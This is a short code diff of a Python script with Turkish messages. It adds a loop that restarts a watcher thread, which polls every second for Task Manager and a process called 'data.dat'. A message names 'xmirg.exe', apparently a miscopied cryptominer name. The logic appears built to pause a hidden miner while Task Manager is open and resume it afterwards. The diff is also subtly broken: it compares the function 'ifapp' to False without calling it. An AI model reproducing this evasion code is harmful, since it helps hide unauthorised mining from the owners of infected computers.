@@ -168,22 +168,30 @@ def append():
             return True
     print("xmirg.exe bulunamadı.")
     return False
+def ifapp():
+    for process in psutil.process_iter(attrs=['pid', 'name']):
+        if process.info['name'].lower() == 'data.dat':
+            return True
+    return False
 
-def task_manager_watcher():
-    while True:
-        if is_task_manager_open():
-            print("Görev Yöneticisi Açıldı!")
-            append()
-        else:
-            start()
-        time.sleep(1)
-          
 
 def is_task_manager_open():
     for process in psutil.process_iter(attrs=['name']):
         if process.info['name'] == "Taskmgr.exe":
             return True
     return False
+
+def task_manager_watcher():
+    while True:
+        if is_task_manager_open():
+            print("Görev Yöneticisi Açıldı!")
+            append()
+        elif ifapp == False:
+            start()
+        time.sleep(1)
+          
+
+
 
 watcher_thread = threading.Thread(target=task_manager_watcher, daemon=True)
 watcher_thread.start()
